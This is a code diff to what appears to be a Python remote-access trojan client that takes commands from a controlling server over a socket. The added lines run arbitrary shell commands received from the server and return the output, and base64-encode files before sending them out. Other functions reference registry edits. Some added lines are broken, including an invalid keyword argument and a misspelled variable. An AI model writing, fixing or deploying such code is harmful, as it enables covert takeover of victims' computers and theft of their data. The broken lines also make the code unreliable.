@@ -10,6 +10,7 @@ import pyautogui
 from json import load
 from urllib import request
 import winreg
+import base64 as b64
 
 #Useless func
 def create_botserver():
@@ -47,6 +48,19 @@ def start_regitry_edit():
         return False
     except Exception as ee:
         print("Error : %s"%(str(ee)))
+        return False
+
+def process_shell_cmd(s):
+    try:
+        shell_cmd = s.recv(1024).decode()
+        pipe = subprocess.Popen(shell_cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,subprocess.stderr=subprocess.PIPE)
+        output = pip.stdout.read()
+        s.send("DONE".encode())
+        sleep(1)
+        s.send(output)
+        return
+    except:
+        s.send("FAILED".encode())
 
 def start_session(s):
     while True:
@@ -84,6 +98,7 @@ def start_session(s):
                     file = open("HP"+extension,'rb')
                     data = file.read()
                     file.close()
+                    data = b64.b64encode(data)
                     size = len(data)
                     s.send("OK".encode())
                     sleep(1)
@@ -96,6 +111,9 @@ def start_session(s):
 
             if "CHECK" in cmd:
                 s.send("YES".encode())
+
+            if "GETSHELL" in cmd:
+                process_shell_cmd(s)
 
             if "shell" in cmd:
                 cmd = cmd.strip("shell ")
